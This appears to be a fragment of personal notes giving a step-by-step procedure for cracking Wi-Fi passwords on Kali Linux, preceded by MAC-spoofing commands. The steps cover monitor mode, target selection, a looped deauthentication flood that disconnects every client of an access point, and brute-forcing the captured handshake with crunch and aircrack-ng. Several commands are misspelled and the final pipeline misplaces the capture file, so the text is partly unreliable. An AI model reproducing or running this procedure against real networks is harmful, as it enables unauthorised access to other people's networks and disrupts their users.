    - arp table: run `arp -a`
    - get mac address: `macchanger -s eth0`
    - set random mac address: `macchanger -r eth0`

wifi cracking on kali linux:
1. install aircrack-bg for monitoring and crunch for word generation
2. ifconfig to check network interface card (NIC) name : Eg. wlo1
3. setup network access card to monitor mode
    - `ifconfic wlo1 down` : turn down the NIC
    - `iwconfig wlo1 mode monitor` : Switch NIC to monitor mode
    - `ifconfic wlo1 up` : turn up the NIC
4. ensure no service is running in background on NIC
    - `airmon-ng check wlo1` : checks for any service running on NIC wol1
    - `airmon-ng check kill` : kills any service running on NIC
5. Run arodump scan on NIC
    -  `airodump-ng wlo1` : It starts scan on NIC wlo1
6. Aboce command displays all the available access points. Columns are:
     - BSSID : MAC address of all the routers found in above scanning
     -  CH : channel number for the access point
7. Pick the target BSSID for Penetration testing
8. Check for all the devices connected to that access point
    - airodump-ng -c <channel number of target BSSID> -w <output path> --bssid <target bssid>
9. Deauthenticate the device connected to target bssid+channel
    - `airmon-ng start wlo1 <target channel number> : Starts monitoring on specified channel number.
        It is important step for when the deauthentication packet is sent to that channel.
    - `airreplay-ng -0 0 -a <target BSSID> wlo1` : Sends deauthentication broadcast packet to target bssid in a loop
    - Run it for a few min to ensure all the devices are disconnected
10. Stop the monitoring. Check the output file provided in step 8
11. Use crunch to guess the password
    - crunch <min length> <max length> -t <regex> <list of characters to permute> :
        It will generate list of words with given length and character constraints
12. Pipe the output of crunch to the packets captured in step 9
    - `crunch 12 12 -t sweet@@@@@@%%% qwertyuioplkjhgfdsazxcvbnm1234567890 | aircrack-ng -w <output file from step 8> -e <ESSID of target BSSID>`
        This will match all the words generated by crunch with the packets generated in step 9
